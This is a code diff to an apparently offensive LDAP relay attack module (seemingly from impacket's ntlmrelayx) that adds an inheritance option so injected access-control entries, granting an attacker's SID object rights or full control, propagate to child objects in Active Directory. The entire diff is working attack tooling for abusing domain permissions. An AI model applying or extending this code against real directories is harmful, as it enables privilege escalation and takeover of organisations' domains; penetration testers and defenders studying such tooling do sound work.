@@ -384,11 +384,16 @@ class LDAPAttack(ProtocolAttack):
         entry = self.client.entries[0]
         secDescData = entry['nTSecurityDescriptor'].raw_values[0]
         secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
-        
+
         if not self.args.delete:
+            aceflags = 0x00
+            if hasattr(self.args, "inheritance") and self.args.inheritance:
+                LOG.debug('Inheritance is set. Adding CONTAINER_INHERIT_ACE, OBJECT_INFERIT_ACE')
+                aceflags = ACE.CONTAINER_INHERIT_ACE + ACE.OBJECT_INHERIT_ACE
+        
             if self.args.rights.lower() in list(rights.keys()):
                 for guid in rights[self.args.rights.lower()]:
-                    secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid))
+                    secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid, aceflags))
             else:
                 LOG.error(f'{self.args.rights} right is not valid')
                 return
@@ -949,10 +954,10 @@ class LDAPAttack(ProtocolAttack):
             LOG.info('Domain info dumped into lootdir!')
 
 # Create an object ACE with the specified privguid and our sid
-def create_object_ace(privguid, sid):
+def create_object_ace(privguid, sid, aceflags=0x00):
     nace = ldaptypes.ACE()
     nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
-    nace['AceFlags'] = 0x02 # inherit to child objects
+    nace['AceFlags'] = aceflags # inherit to child objects
     acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
     acedata['Mask'] = ldaptypes.ACCESS_MASK()
     #acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
@@ -967,10 +972,10 @@ def create_object_ace(privguid, sid):
     return nace
 
 # Create an ALLOW ACE with the specified sid
-def create_allow_ace(sid):
+def create_allow_ace(sid, aceflags=0x00):
     nace = ldaptypes.ACE()
     nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
-    nace['AceFlags'] = 0x02
+    nace['AceFlags'] = aceflags
     acedata = ldaptypes.ACCESS_ALLOWED_ACE()
     acedata['Mask'] = ldaptypes.ACCESS_MASK()
     acedata['Mask']['Mask'] = 983551 # Full control
